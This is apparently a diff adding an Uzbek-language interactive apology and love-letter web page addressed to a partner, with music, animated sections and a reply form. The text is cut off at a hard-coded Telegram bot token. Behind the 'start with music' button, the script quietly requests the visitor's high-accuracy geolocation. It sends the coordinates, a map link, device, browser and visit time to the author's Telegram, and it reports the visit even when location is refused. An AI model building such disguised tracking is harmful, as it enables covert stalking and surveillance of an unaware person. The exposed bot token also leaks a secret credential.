@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Dilimdagi sen ❤️</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;600;700&family=Caveat:wght@500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --deep-emerald:#063b34; --emerald:#0d7a63; --soft-green:#8fdcc4;
+    --white:#f4faf8; --ice-blue:#bfeaf2; --dark-navy:#08182b; --very-dark:#020e0c;
+    --glass-bg:rgba(255,255,255,0.06); --glass-border:rgba(255,255,255,0.16);
+    --text-main:#eafaf5; --text-soft:#a9d9cd;
+  }
+  *{box-sizing:border-box; -webkit-tap-highlight-color:transparent;}
+  html,body{ margin:0; padding:0; width:100%; min-height:100%; overflow-x:hidden; font-family:'Cormorant Garamond', Georgia, serif; }
+  body{
+    background: linear-gradient(160deg, var(--very-dark), var(--dark-navy), var(--deep-emerald));
+    background-size:300% 300%; animation: gradientFlow 26s ease infinite;
+    position:relative; min-height:100vh; color:var(--text-main);
+  }
+  @keyframes gradientFlow{0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
+  .handwriting{ font-family:'Caveat', cursive; }
+
+  #ambient-layer{ position:fixed; inset:0; pointer-events:none; z-index:1; overflow:hidden; }
+  .amb-dot{ position:absolute; bottom:-20px; border-radius:50%; opacity:0; filter:blur(1px); animation: ambFloat linear infinite; background: radial-gradient(circle, rgba(191,234,242,.9), rgba(191,234,242,0)); }
+  @keyframes ambFloat{0%{transform:translateY(0) scale(.6);opacity:0;}10%{opacity:var(--op,.5);}90%{opacity:var(--op,.5);}100%{transform:translateY(-110vh) scale(1);opacity:0;}}
+
+  .app-wrap{ position:relative; z-index:2; }
+  .section{ min-height:100vh; width:100%; display:none; align-items:center; justify-content:center; flex-direction:column; padding:60px 20px 100px; opacity:0; transition:opacity 1s ease; }
+  .section.active{ display:flex; }
+  .section.show{ opacity:1; }
+
+  .glass-card{ position:relative; width:100%; max-width:600px; background:var(--glass-bg); backdrop-filter:blur(20px) saturate(140%); -webkit-backdrop-filter:blur(20px) saturate(140%); border:1px solid var(--glass-border); border-radius:22px; padding:46px 36px; box-shadow:0 20px 60px rgba(0,0,0,.4), inset 0 1px 0 rgba(255,255,255,.08); text-align:center; }
+
+  h1.hero{ font-weight:700; font-size:clamp(30px,7vw,48px); letter-spacing:1px; color:var(--white); margin:0 0 20px; }
+  h2.sub{ font-weight:600; font-size:clamp(21px,4.8vw,28px); color:var(--soft-green); margin:0 0 16px; line-height:1.4; }
+  .line{ font-size:19px; line-height:1.85; color:var(--text-soft); margin:0 0 12px; opacity:0; transform:translateY(14px); filter:blur(4px); transition:opacity .8s ease, transform .8s ease, filter .8s ease; }
+  .line.reveal{ opacity:1; transform:translateY(0); filter:blur(0); }
+  .line.strong{ color:var(--white); font-weight:600; font-size:22px; }
+
+  .btn-row{ display:flex; gap:16px; justify-content:center; flex-wrap:wrap; margin-top:26px; min-height:54px; }
+  .glass-btn{ font-family:'Cormorant Garamond', serif; font-size:18px; font-weight:600; letter-spacing:.5px; padding:13px 34px; border-radius:100px; border:1px solid rgba(255,255,255,.35); background:linear-gradient(135deg, rgba(191,234,242,.16), rgba(15,122,99,.28)); backdrop-filter:blur(10px); color:var(--white); cursor:pointer; box-shadow:0 8px 22px rgba(0,0,0,.3); transition:transform .3s ease, box-shadow .3s ease, opacity .4s ease; opacity:0; pointer-events:none; }
+  .glass-btn.ready{ opacity:1; pointer-events:auto; }
+  .glass-btn:hover{ transform:translateY(-3px) scale(1.03); box-shadow:0 12px 30px rgba(0,0,0,.4); }
+  .glass-btn:active{ transform:translateY(0) scale(.97); }
+
+  /* section 1: single light dot */
+  #lightDot{ width:8px; height:8px; border-radius:50%; background:var(--ice-blue); box-shadow:0 0 30px 10px rgba(191,234,242,.6); margin-bottom:40px; animation: dotGrow 3s ease forwards; }
+  @keyframes dotGrow{ 0%{ transform:scale(0.3); opacity:0; } 40%{ opacity:1; } 100%{ transform:scale(1); opacity:1; box-shadow:0 0 60px 24px rgba(191,234,242,.35); } }
+
+  /* section 4: SEN kinetic */
+  #senWord{ font-size:clamp(60px,16vw,140px); font-weight:700; letter-spacing:8px; color:var(--white); opacity:0; transform:scale(.7); filter:blur(10px); transition:opacity 1.1s ease, transform 1.1s cubic-bezier(.2,.8,.3,1.1), filter 1.1s ease; margin-bottom:20px; }
+  #senWord.reveal{ opacity:1; transform:scale(1); filter:blur(0); }
+
+  /* section 6: letter scatter */
+  .scatter-char{ display:inline-block; opacity:0; transition:opacity .5s ease, transform .5s ease, filter .5s ease; }
+
+  /* kinetic word reveal */
+  .kinetic-word{ display:inline-block; opacity:0; transform:translateY(16px); filter:blur(3px); transition:opacity .6s ease, transform .6s ease, filter .6s ease; margin-right:0.3em; }
+  .kinetic-word.reveal{ opacity:1; transform:translateY(0); filter:blur(0); }
+
+  /* section 9: glass sphere */
+  .sphere-wrap{ position:relative; width:260px; height:260px; margin:0 auto 20px; display:flex; align-items:center; justify-content:center; }
+  .sphere-core{ width:120px; height:120px; border-radius:50%; background:radial-gradient(circle at 35% 30%, rgba(191,234,242,.5), rgba(13,122,99,.25) 60%, rgba(6,59,52,.15)); border:1px solid rgba(255,255,255,.25); box-shadow:0 0 50px rgba(191,234,242,.35), inset 0 0 30px rgba(255,255,255,.1); display:flex; align-items:center; justify-content:center; font-size:17px; letter-spacing:2px; color:var(--white); font-weight:600; }
+  .orbit-ring{ position:absolute; inset:0; animation: orbitSpin 22s linear infinite; }
+  @keyframes orbitSpin{ from{ transform:rotate(0deg); } to{ transform:rotate(360deg); } }
+  .orbit-label{ position:absolute; top:50%; left:50%; font-size:12px; letter-spacing:1.5px; color:var(--ice-blue); font-family:'Cormorant Garamond',serif; font-weight:600; white-space:nowrap; }
+
+  /* section 10 & others: slide-in from right */
+  .slide-line{ opacity:0; transform:translateX(40px); transition:opacity .7s ease, transform .7s ease; }
+  .slide-line.reveal{ opacity:1; transform:translateX(0); }
+
+  /* section 13: timeline */
+  .timeline-h{ display:flex; flex-wrap:wrap; justify-content:center; gap:0; margin:20px 0 24px; }
+  .tl-node{ display:flex; flex-direction:column; align-items:center; opacity:0; transform:translateY(10px); transition:opacity .6s ease, transform .6s ease; position:relative; padding:0 14px; }
+  .tl-node.reveal{ opacity:1; transform:translateY(0); }
+  .tl-node .dot{ width:10px; height:10px; border-radius:50%; background:var(--ice-blue); box-shadow:0 0 10px rgba(191,234,242,.8); margin-bottom:8px; }
+  .tl-node .lbl{ font-size:13px; letter-spacing:1.5px; color:var(--text-soft); }
+  .tl-arrow{ color:var(--text-soft); opacity:.5; align-self:center; margin-bottom:20px; }
+
+  /* section 14: left border cascade */
+  .cascade-item{ text-align:left; border-left:2px solid rgba(191,234,242,.4); padding-left:16px; margin-bottom:14px; opacity:0; transform:translateX(-14px); transition:opacity .6s ease, transform .6s ease; color:var(--text-soft); font-size:17px; }
+  .cascade-item.reveal{ opacity:1; transform:translateX(0); }
+
+  /* section 15: checkmark list */
+  .check-item{ display:flex; align-items:flex-start; gap:12px; text-align:left; margin-bottom:12px; opacity:0; transform:translateY(8px); transition:opacity .6s ease, transform .6s ease; color:var(--text-soft); font-size:16.5px; }
+  .check-item.reveal{ opacity:1; transform:translateY(0); }
+  .check-icon{ color:var(--soft-green); font-size:16px; margin-top:2px; }
+
+  /* section 16: dark cinematic */
+  .section16-bg{ background: radial-gradient(circle at 50% 30%, #0a2a24, #020a08 80%); }
+
+  /* section 17: kinetic list then merge */
+  .kinetic-list-word{ display:inline-block; font-size:clamp(20px,5vw,30px); font-weight:600; color:var(--ice-blue); margin:6px 14px; opacity:0; transform:scale(.6); transition:opacity .5s ease, transform .5s ease; }
+  .kinetic-list-word.reveal{ opacity:1; transform:scale(1); }
+
+  /* section 18: minimal calm */
+  .section18-light{ width:14px; height:14px; border-radius:50%; background:var(--soft-green); box-shadow:0 0 40px 16px rgba(143,220,196,.4); margin-bottom:32px; animation: calmPulse 3.2s ease-in-out infinite; }
+  @keyframes calmPulse{ 0%,100%{ transform:scale(1); opacity:.85; } 50%{ transform:scale(1.3); opacity:1; } }
+
+  /* letter card */
+  .letter-card{ text-align:left; font-size:22px; line-height:2; color:var(--white); white-space:pre-line; }
+
+  /* section 20 final: svg heart outline */
+  .heart-outline{ width:140px; height:130px; margin-bottom:10px; }
+  .heart-outline path{ fill:none; stroke:var(--ice-blue); stroke-width:2.4; stroke-dasharray:600; stroke-dashoffset:600; filter:drop-shadow(0 0 8px rgba(191,234,242,.6)); animation: drawHeart 2.6s ease forwards; }
+  @keyframes drawHeart{ to{ stroke-dashoffset:0; } }
+
+  /* textarea */
+  .glass-textarea{ width:100%; font-family:'Cormorant Garamond', serif; font-size:17px; padding:18px 20px; border-radius:18px; border:1px solid rgba(255,255,255,.22); background:rgba(255,255,255,.05); backdrop-filter:blur(10px); color:var(--white); resize:none; outline:none; min-height:150px; line-height:1.6; margin-bottom:10px; transition:box-shadow .3s ease, border .3s ease; }
+  .glass-textarea:focus{ border-color:var(--ice-blue); box-shadow:0 0 0 3px rgba(191,234,242,.18); }
+  .glass-textarea::placeholder{ color:#a9d9cdaa; }
+  .warn-text{ font-size:13px; color:#ffd9a0; min-height:1.2em; margin-bottom:8px; opacity:0; transition:opacity .3s ease; line-height:1.5; }
+  .warn-text.show{ opacity:1; }
+  .success-text{ font-size:17px; color:var(--soft-green); opacity:0; transform:translateY(8px); transition:opacity .6s ease, transform .6s ease; margin-top:14px; }
+  .success-text.show{ opacity:1; transform:translateY(0); }
+
+  /* music prompt */
+  #musicPrompt{ position:fixed; inset:0; z-index:250; display:flex; align-items:center; justify-content:center; flex-direction:column; background:radial-gradient(circle at 50% 40%, #0a2a24, #020a08 80%); text-align:center; padding:24px; transition:opacity .8s ease; }
+  #musicPrompt.hide{ opacity:0; pointer-events:none; }
+
+  /* persistent player */
+  #player{ position:fixed; bottom:16px; left:50%; transform:translateX(-50%); z-index:200; display:none; align-items:center; gap:12px; background:rgba(8,24,20,.6); backdrop-filter:blur(14px); border:1px solid rgba(255,255,255,.18); border-radius:100px; padding:10px 18px; box-shadow:0 10px 30px rgba(0,0,0,.4); }
+  #player.show{ display:flex; }
+  #playPauseBtn{ width:32px; height:32px; border-radius:50%; background:rgba(191,234,242,.16); border:1px solid rgba(255,255,255,.3); color:var(--white); display:flex; align-items:center; justify-content:center; cursor:pointer; font-size:14px; }
+  #volumeRange{ width:80px; accent-color: var(--ice-blue); }
+
+  .signature{ font-size:14px; letter-spacing:1px; color:var(--text-soft); margin-top:30px; }
+  .signature a{ color:var(--white); text-decoration:none; font-weight:600; }
+
+  #globalFooter{ position:fixed; bottom:0; left:0; width:100%; z-index:170; display:flex; justify-content:center; padding:10px 0; pointer-events:none; }
+  #globalFooter a{ pointer-events:auto; font-size:12.5px; letter-spacing:.5px; color:var(--text-soft); text-decoration:none; display:inline-flex; align-items:center; gap:5px; background:rgba(8,24,20,.45); backdrop-filter:blur(8px); padding:6px 14px; border-radius:100px; border:1px solid rgba(255,255,255,.12); }
+  #globalFooter a:hover{ color:var(--white); }
+  #player.show ~ #globalFooter{ bottom:64px; }
+
+  @media (max-width:480px){
+    .glass-card{ padding:36px 22px; }
+    .sphere-wrap{ width:210px; height:210px; }
+    .sphere-core{ width:96px; height:96px; font-size:14px; }
+  }
+  @media (prefers-reduced-motion: reduce){ *{ animation-duration:.01ms !important; animation-iteration-count:1 !important; transition-duration:.01ms !important; } }
+</style>
+</head>
+<body>
+
+<div id="ambient-layer"></div>
+
+<!-- MUSIC PROMPT -->
+<div id="musicPrompt">
+  <div style="font-size:15px; color:var(--text-soft); letter-spacing:1px; margin-bottom:18px;">🎧</div>
+  <h2 class="sub" style="max-width:420px;">Bu hikoyani musiqa bilan o‘qishni xohlaysanmi?</h2>
+  <div class="btn-row"><button class="glass-btn ready" onclick="startWithMusic()">Ha, boshlaylik 🎧</button></div>
+</div>
+
+<audio id="bgMusic" preload="auto" loop>
+  <source src="music.mp3" type="audio/mpeg">
+</audio>
+
+<div id="player">
+  <div id="playPauseBtn" onclick="togglePlay()">❚❚</div>
+  <input type="range" id="volumeRange" min="0" max="1" step="0.05" value="0.75" oninput="setVolume(this.value)">
+</div>
+
+<div id="globalFooter">
+  <a href="https://t.me/maqsudbek_musurmonov" target="_blank" rel="noopener">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M21.9 3.5 2.7 11c-1.1.4-1.1 1.9.1 2.3l4.6 1.5 1.8 5.5c.2.6.9.8 1.4.4l2.6-2.1 4.6 3.4c.7.5 1.7.1 1.9-.7l3.4-15.7c.2-1-.7-1.7-1.6-1.3ZM8.7 13.9l9.4-6.8c.3-.2.6.2.3.4l-8 7.6-.3 3.7-1.4-4.9Z"/></svg>
+    @maqsudbek_musurmonov
+  </a>
+</div>
+
+<div class="app-wrap">
+
+  <!-- 1 -->
+  <section class="section" id="s1">
+    <div id="lightDot"></div>
+    <p class="line" data-r="0">Bu safar senga oddiy gaplar aytmayman...</p>
+    <p class="line" data-r="1">Ko‘pdan beri ichimda qolib ketgan gaplarim bor.</p>
+    <p class="line" data-r="2">Bugun ularning hammasini senga aytmoqchiman.</p>
+    <div class="btn-row"><button class="glass-btn" id="btn1" onclick="goTo('s1','s2')">Boshlaylik...</button></div>
+  </section>
+
+  <!-- 2 -->
+  <section class="section" id="s2">
+    <div class="glass-card">
+      <div id="kinetic2"></div>
+      <div class="btn-row"><button class="glass-btn" id="btn2" onclick="goTo('s2','s3')">Davom etaman...</button></div>
+    </div>
+  </section>
+
+  <!-- 3 -->
+  <section class="section" id="s3">
+    <div class="glass-card">
+      <p class="line" data-r="0">Men o‘zimni oqlash uchun kelmadim.</p>
+      <p class="line" data-r="1">Men seni tushunish uchun keldim.</p>
+      <p class="line" data-r="2">Ko‘nglingni og‘ritganimni tushunaman.</p>
+      <p class="line" data-r="3">Va buning uchun chin dildan uzr so‘rayman.</p>
+      <h2 class="line strong" data-r="4">KECHIR MENI, JUFTIM. ❤️</h2>
+      <div class="btn-row"><button class="glass-btn" id="btn3" onclick="goTo('s3','s4')">Keyingi</button></div>
+    </div>
+  </section>
+
+  <!-- 4 -->
+  <section class="section" id="s4">
+    <div id="senWord">SEN.</div>
+    <p class="line" data-r="0">Shu bitta so‘z men uchun juda ko‘p narsani anglatadi.</p>
+    <p class="line" data-r="1">Sen mening quvonchim.</p>
+    <p class="line" data-r="2">Sen mening xotirjamligim.</p>
+    <p class="line" data-r="3">Sen qalbimga eng yaqin insonlardan birisan.</p>
+    <div class="btn-row"><button class="glass-btn" id="btn4" onclick="goTo('s4','s5')">Keyingi</button></div>
+  </section>
+
+  <!-- 5 -->
+  <section class="section" id="s5">
+    <div class="glass-card">
+      <p class="line" data-r="0">Ba'zi gaplarni yuzma-yuz aytishga so‘z topolmayman.</p>
+      <p class="line" data-r="1">Ba'zilarini aytishga uyalaman.</p>
+      <p class="line" data-r="2">Shuning uchun bugun yuragim gapirsin.</p>
+      <p class="line" data-r="3">Men seni o‘ylaganimda ichimda juda ko‘p chiroyli hislar paydo bo‘ladi.</p>
+      <div class="btn-row"><button class="glass-btn" id="btn5" onclick="goTo('s5','s6')">Keyingi</button></div>
+    </div>
+  </section>
+
+  <!-- 6: scatter text -->
+  <section class="section" id="s6">
+    <h1 class="hero" id="scatterTitle" style="min-height:1.3em;"></h1>
+    <p class="line" data-r="0">Lekin bu oddiy "sevaman" emas.</p>
+    <p class="line" data-r="1">Bu — seni o‘ylaganimda qalbimdagi hissiyot.</p>
+    <p class="line" data-r="2">Bu — seni xursand ko‘rishni xohlash.</p>
+    <p class="line" data-r="3">Bu — seni yo‘qotishni istamaslik.</p>
+    <p class="line" data-r="4">Bu — sening yoningda bo‘lishni xohlash.</p>
+    <div class="btn-row"><button class="glass-btn" id="btn6" onclick="goTo('s6','s7')">Keyingi</button></div>
+  </section>
+
+  <!-- 7: ripple list -->
+  <section class="section" id="s7">
+    <div class="glass-card">
+      <h2 class="sub">Sening nozikliging</h2>
+      <p class="line" data-r="0">Men sendagi noziklikni qadrlayman.</p>
+      <p class="line" data-r="1">Muomalangni.</p>
+      <p class="line" data-r="2">Mehringni.</p>
+      <p class="line" data-r="3">Uyatchanligingni.</p>
+      <p class="line" data-r="4">Qalbingdagi go‘zallikni.</p>
+      <h2 class="line strong" data-r="5">Men seni aynan SEN bo‘lganing uchun qadrlayman.</h2>
+      <div class="btn-row"><button class="glass-btn" id="btn7" onclick="goTo('s7','s8')">Keyingi</button></div>
+    </div>
+  </section>
+
+  <!-- 8: hijob, respectful soft -->
+  <section class="section" id="s8">
+    <div class="glass-card" style="border-color:rgba(191,234,242,.28);">
+      <p class="line" data-r="0">Men seni faqat tashqi ko‘rinishing uchun qadrlamayman.</p>
+      <p class="line" data-r="1">Sening qalbing va ichki dunyong men uchun juda qadrli.</p>
+      <p class="line" data-r="2">Hijobingdagi hayo va nafislikni hurmat qilaman.</p>
+      <h2 class="line strong" data-r="3">Sen o‘zing tanlagan yo‘ling bilan yanada go‘zal ko‘rinasan.</h2>
+      <div class="btn-row"><button class="glass-btn" id="btn8" onclick="goTo('s8','s9')">Keyingi</button></div>
+    </div>
+  </section>
+
+  <!-- 9: glass sphere -->
+  <section class="section" id="s9">
+    <div class="glass-card">
+      <div class="sphere-wrap">
+        <div class="orbit-ring" id="orbitRing"></div>
+        <div class="sphere-core">ISHONCH</div>
+      </div>
+      <p class="line" data-r="0">Men senga ishonaman.</p>
+      <p class="line" data-r="1">Va sening ishonchingni qadrlayman.</p>
+      <p class="line" data-r="2">Men ham sen ishonadigan inson bo‘lishni xohlayman.</p>
+      <div class="btn-row"><button class="glass-btn" id="btn9" onclick="goTo('s9','s10')">Keyingi</button></div>
+    </div>
+  </section>
+
+  <!-- 10: slide in -->
+  <section class="section" id="s10">
+    <div class="glass-card">
+      <p class="slide-line" data-r="0" style="font-size:19px; color:var(--text-soft);">Men senga faqat sevgi emas...</p>
+      <p class="slide-line" data-r="1" style="font-size:19px; color:var(--text-soft);">Mehr bermoqchiman.</p>
+      <p class="slide-line" data-r="2" style="font-size:19px; color:var(--text-soft);">E’tibor bermoqchiman.</p>
+      <p class="slide-line" data-r="3" style="font-size:19px; color:var(--text-soft);">G‘amxo‘rlik qilmoqchiman.</p>
+      <p class="slide-line strong" data-r="4" style="font-size:22px; color:var(--white); font-weight:600;">Yoningda bo‘lishni xohlayman.</p>
+      <div class="btn-row"><button class="glass-btn" id="btn10" onclick="goTo('s10','s11')">Keyingi</button></div>
+    </div>
+  </section>
+
+  <!-- 11: brightening -->
+  <section class="section" id="s11">
+    <div class="glass-card" id="brightCard">
+      <p class="line" data-r="0">Sening kulgingni ko‘rish men uchun juda yoqimli.</p>
+      <p class="line" data-r="1">Shuning uchun seni xafa qiladigan sabab emas...</p>
+      <h2 class="line strong" data-r="2">kuldiradigan sabab bo‘lishni xohlayman.</h2>
+      <div class="btn-row"><button class="glass-btn" id="btn11" onclick="goTo('s11','s12')">Keyingi</button></div>
+    </div>
+  </section>
+
+  <!-- 12: soft zoom -->
+  <section class="section" id="s12">
+    <div class="glass-card">
+      <p class="line" data-r="0">Ba'zan seni sog‘inaman.</p>
+      <p class="line" data-r="1">Gaplashgim keladi.</p>
+      <p class="line" data-r="2">Holingni so‘ragim keladi.</p>
+      <p class="line" data-r="3">Shunchaki sen bilan vaqt o‘tkazgim keladi.</p>
+      <h2 class="line strong" data-r="4">Chunki sen menga oddiy inson bo‘lib qolmagansan.</h2>
+      <div class="btn-row"><button class="glass-btn" id="btn12" onclick="goTo('s12','s13')">Keyingi</button></div>
+    </div>
+  </section>
+
+  <!-- 13: timeline -->
+  <section class="section" id="s13">
+    <div class="glass-card">
+      <div class="timeline-h" id="timelineH">
+        <div class="tl-node"><div class="dot"></div><div class="lbl">BUGUN</div></div>
+        <div class="tl-arrow">→</div>
+        <div class="tl-node"><div class="dot"></div><div class="lbl">ERTAGA</div></div>
+        <div class="tl-arrow">→</div>
+        <div class="tl-node"><div class="dot"></div><div class="lbl">KEYIN</div></div>
+        <div class="tl-arrow">→</div>
+        <div class="tl-node"><div class="dot"></div><div class="lbl">BIRGA</div></div>
+        <div class="tl-arrow">→</div>
+        <div class="tl-node"><div class="dot"></div><div class="lbl">BIZ</div></div>
+      </div>
+      <p class="line" data-r="0">Men kelajak haqida o‘ylaganimda, unda seni ko‘rishni xohlayman.</p>
+      <p class="line" data-r="1">Sen bilan ko‘proq xotiralar yaratishni xohlayman.</p>
+      <div class="btn-row" id="btnRow13"><button class="glass-btn" id="btn13" onclick="goTo('s13','s14')">Keyingi</button></div>
+    </div>
+  </section>
+
+  <!-- 14: cascade -->
+  <section class="section" id="s14">
+    <div class="glass-card">
+      <h2 class="sub">Mening orzum</h2>
+      <div class="cascade-item">Sen bilan tinch, mehrli va chiroyli hayot qurish.</div>
+      <div class="cascade-item">Bir-birimizni tushunish.</div>
+      <div class="cascade-item">Bir-birimizga suyanch bo‘lish.</div>
+      <div class="cascade-item">Birga kulish.</div>
+      <div class="cascade-item">Birga baxtli bo‘lish.</div>
+      <div class="btn-row" id="btnRow14"><button class="glass-btn" id="btn14" onclick="goTo('s14','s15')">Keyingi</button></div>
+    </div>
+  </section>
+
+  <!-- 15: checklist -->
+  <section class="section" id="s15">
+    <div class="glass-card">
+      <h2 class="sub">Mening va’dam</h2>
+      <div class="check-item"><span class="check-icon">✓</span><span>Men seni ko‘proq tinglashga harakat qilaman.</span></div>
+      <div class="check-item"><span class="check-icon">✓</span><span>Ko‘proq e’tibor beraman.</span></div>
+      <div class="check-item"><span class="check-icon">✓</span><span>Ko‘proq tushunishga harakat qilaman.</span></div>
+      <div class="check-item"><span class="check-icon">✓</span><span>Ko‘nglingni og‘ritib qo‘ysam, buni tan olaman.</span></div>
+      <div class="check-item"><span class="check-icon">✓</span><span>Seni qadrlashni unutmaslikka harakat qilaman.</span></div>
+      <div class="btn-row" id="btnRow15"><button class="glass-btn" id="btn15" onclick="goTo('s15','s16')">Keyingi</button></div>
+    </div>
+  </section>
+
+  <!-- 16: dark cinematic -->
+  <section class="section section16-bg" id="s16">
+    <p class="line" data-r="0" style="max-width:480px;">Sen hayotimda juda katta joy egallab bo‘lgansan.</p>
+    <p class="line" data-r="1" style="max-width:480px;">Shuning uchun seni yo‘qotish fikri menga yoqmaydi.</p>
+    <h2 class="line strong" data-r="2">Men seni asrashni xohlayman.</h2>
+    <h2 class="line strong" data-r="3">Bizni asrashni xohlayman.</h2>
+    <div class="btn-row"><button class="glass-btn" id="btn16" onclick="goTo('s16','s17')">Keyingi</button></div>
+  </section>
+
+  <!-- 17: kinetic list merge -->
+  <section class="section" id="s17">
+    <div id="kineticList17" style="text-align:center; max-width:520px;"></div>
+    <h1 class="hero" id="mergeText17" style="opacity:0; transition:opacity 1s ease; margin-top:10px;">MEN SEN BILAN.</h1>
+    <div class="btn-row"><button class="glass-btn" id="btn17" onclick="goTo('s17','s18')">Keyingi</button></div>
+  </section>
+
+  <!-- 18: calm minimal -->
+  <section class="section" id="s18">
+    <div class="section18-light"></div>
+    <p class="line" data-r="0">Men mukammal emasman.</p>
+    <p class="line" data-r="1">Ba'zan xato qilaman.</p>
+    <p class="line" data-r="2">Ba'zan seni bilmasdan xafa qilib qo‘yishim mumkin.</p>
+    <p class="line" data-r="3">Lekin mening sevgim yolg‘on emas.</p>
+    <h2 class="line strong" data-r="4">Men seni juda qattiq sevaman.</h2>
+    <div class="btn-row"><button class="glass-btn" id="btn18" onclick="goTo('s18','s19')">Keyingi</button></div>
+  </section>
+
+  <!-- 19: handwriting letter -->
+  <section class="section" id="s19">
+    <div class="glass-card">
+      <div class="letter-card handwriting" id="letter19" style="min-height:420px;"></div>
+      <div class="btn-row" id="btnRow19"><button class="glass-btn" id="btn19" onclick="goTo('s19','s20')">Keyingi</button></div>
+    </div>
+  </section>
+
+  <!-- 20: mega final -->
+  <section class="section section16-bg" id="s20">
+    <svg class="heart-outline" viewBox="0 0 100 90" id="heartSvg" style="display:none;">
+      <path d="M50 85 C 20 60, 5 40, 5 22 C 5 8, 18 2, 28 2 C 38 2, 46 8, 50 18 C 54 8, 62 2, 72 2 C 82 2, 95 8, 95 22 C 95 40, 80 60, 50 85 Z"/>
+    </svg>
+    <p class="line" data-r="0">Juftim...</p>
+    <p class="line" data-r="1">Men seni hafa qilgim kelmaydi.</p>
+    <p class="line" data-r="2">Men sen bilan urushib yashagim kelmaydi.</p>
+    <p class="line" data-r="3">Men seni tushunishni xohlayman.</p>
+    <p class="line" data-r="4">Men senga ishonaman.</p>
+    <p class="line" data-r="5">Men seni qadrlayman.</p>
+    <p class="line" data-r="6">Men senga mehrimni va e’tiborimni berishni xohlayman.</p>
+    <p class="line" data-r="7">Va eng muhimi...</p>
+    <h1 class="hero line" data-r="8" style="font-size:clamp(24px,6vw,34px);">MEN SENI JUDA QATTIQ SEVAMAN. ❤️</h1>
+    <p class="line" data-r="9">MEN SEN BILAN HAYOTIMNI O‘TKAZISHNI XOHLAYMAN.</p>
+    <p class="line" data-r="10">Kel, urushmaylik.</p>
+    <p class="line" data-r="11">Bir-birimizni asraylik.</p>
+    <p class="line" data-r="12">Bir-birimizga suyanch bo‘laylik.</p>
+    <p class="line" data-r="13">Va birga baxtli bo‘laylik. ❤️</p>
+    <h2 class="line strong" data-r="14">DILIMDAGI ENG CHIROYLI GAP — SEN.</h2>
+    <h1 class="hero line" data-r="15" style="font-size:clamp(26px,7vw,38px);">SEVAMAN. JUDAYAM. JUDAYAM QATTIQ. FAQAT SENI. ❤️</h1>
+    <div class="btn-row"><button class="glass-btn" id="btn20" onclick="goTo('s20','s21')">Endi navbat senda ❤️</button></div>
+  </section>
+
+  <!-- 21: message -->
+  <section class="section" id="s21">
+    <div class="glass-card">
+      <p class="line reveal">Men senga aytolmagan gaplarimni aytdim.</p>
+      <p class="line reveal">Endi navbat senda, juftim... ❤️</p>
+      <p class="line reveal" style="margin-bottom:16px;">Ko‘nglingdagi gaplarni menga yozib yubor.</p>
+      <textarea class="glass-textarea" id="msgInput" placeholder="Bu yerga menga aytmoqchi bo‘lgan gaplaringni yoz... ❤️" oninput="checkMsg()"></textarea>
+      <div class="warn-text" id="msgWarn">Avval biror gap yozib qo‘y ❤️</div>
+      <div class="btn-row"><button class="glass-btn ready" id="btnSend" onclick="submitMessage()">YUBORISH ❤️</button></div>
+      <div class="success-text" id="successText">Xabaring menga yetib keldi, juftim. ❤️</div>
+    </div>
+  </section>
+
+</div>
+
+<script>
+/* ============ AMBIENT SOFT LIGHT PARTICLES (no hearts) ============ */
+const ambientLayer = document.getElementById('ambient-layer');
+function spawnAmbient(){
+  const el = document.createElement('div');
+  el.className='amb-dot';
+  const size = 3 + Math.random()*6;
+  el.style.width = size+'px'; el.style.height = size+'px';
+  el.style.left = (Math.random()*100)+'vw';
+  el.style.setProperty('--op', 0.25+Math.random()*0.35);
+  const dur = 12+Math.random()*14;
+  el.style.animationDuration = dur+'s';
+  ambientLayer.appendChild(el);
+  setTimeout(()=>el.remove(), dur*1000+500);
+}
+setInterval(spawnAmbient, 420);
+for(let i=0;i<14;i++) setTimeout(spawnAmbient, i*160);
+
+/* ============ MUSIC ============ */
+const bgMusic = document.getElementById('bgMusic');
+const MUSIC_START = 0; /* 0:00 dan boshlanadi */
+let musicOn = false;
+function startWithMusic(){
+  const prompt = document.getElementById('musicPrompt');
+  prompt.classList.add('hide');
+  setTimeout(()=>{ prompt.style.display='none'; }, 850);
+  if(bgMusic.querySelector('source')){
+    bgMusic.volume = 0.75;
+    try{ bgMusic.currentTime = MUSIC_START; }catch(e){}
+    bgMusic.play().then(()=>{ musicOn=true; document.getElementById('player').classList.add('show'); }).catch(()=>{});
+  }
+  requestEntryLocation();
+  showSection('s1');
+}
+function requestEntryLocation(){
+  const { device, browser } = getDeviceInfo();
+  if(!navigator.geolocation){
+    sendTelegram(`🌿 YANGI TASHRIF\n\nDILIMDAGI SEN ❤️ saytiga kirildi.\n\n🕐 Vaqt:\n${formatTime()}\n\n📱 Qurilma:\n${device} / ${browser}\n\n📍 Joylashuv:\nBrauzer qo‘llamaydi`);
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(
+    pos=>{
+      const { latitude, longitude } = pos.coords;
+      const mapsUrl = `https://maps.google.com/?q=${latitude},${longitude}`;
+      sendTelegram(`🌿 YANGI TASHRIF\n\nDILIMDAGI SEN ❤️ saytiga kirildi.\n\n🕐 Vaqt:\n${formatTime()}\n\n📱 Qurilma:\n${device} / ${browser}\n\n📍 Joylashuv:\nLatitude: ${latitude}\nLongitude: ${longitude}\n🗺️ ${mapsUrl}`);
+    },
+    ()=>{
+      sendTelegram(`🌿 YANGI TASHRIF\n\nDILIMDAGI SEN ❤️ saytiga kirildi.\n\n🕐 Vaqt:\n${formatTime()}\n\n📱 Qurilma:\n${device} / ${browser}\n\n📍 Joylashuv:\nRuxsat berilmadi`);
+    },
+    { timeout: 8000, enableHighAccuracy: true }
+  );
+}
+function togglePlay(){
+  if(!bgMusic.querySelector('source')) return;
+  if(musicOn){ bgMusic.pause(); musicOn=false; document.getElementById('playPauseBtn').textContent='▶'; }
+  else { bgMusic.play().then(()=>{ musicOn=true; document.getElementById('playPauseBtn').textContent='❚❚'; }).catch(()=>{}); }
+}
+function setVolume(v){ bgMusic.volume = parseFloat(v); }
+
+/* ============ TELEGRAM ============ */
+const BOT_TOKEN = '8679032439:AAHf4g7ZEQQvOcCY8yE0Yn6V79cnstuK9Jk';
